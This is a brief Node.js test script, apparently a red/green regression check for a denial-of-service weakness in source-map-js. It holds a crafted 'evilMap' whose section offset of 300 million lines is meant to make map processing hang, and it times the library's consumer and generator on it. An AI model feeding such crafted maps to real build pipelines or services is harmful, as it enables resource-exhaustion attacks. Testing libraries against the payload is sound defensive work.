// Direct red-capable loop against the library itself.
// node direct.js <node_modules_root_containing_source-map-js>
const path = require('path');
const root = path.resolve(process.argv[2]);
const smj = require(path.join(root, 'source-map-js'));
const ver = require(path.join(root, 'source-map-js/package.json')).version;

const evilMap = {
  version: 3,
  file: 'out.css',
  sections: [
    {
      offset: { line: 300000000, column: 0 },
      map: { version: 3, file: 'a.css', sources: ['a.css'], names: [], mappings: 'AAAA' },
    },
  ],
};

console.log('source-map-js=' + ver);
const t0 = Date.now();
let verdict;
try {
  const c = new smj.SourceMapConsumer(evilMap);
  const g = smj.SourceMapGenerator.fromSourceMap(c); // what postcss map-generator.js:110 does
  verdict = 'produced map of ' + g.toString().length + ' bytes';
} catch (e) {
  verdict = 'threw: ' + e.message.slice(0, 100);
}
const ms = Date.now() - t0;
console.log(`elapsed=${ms}ms verdict=${verdict}`);
if (ms > 1000) {
  console.log('RESULT: RED');
  process.exit(1);
}
console.log('RESULT: GREEN');
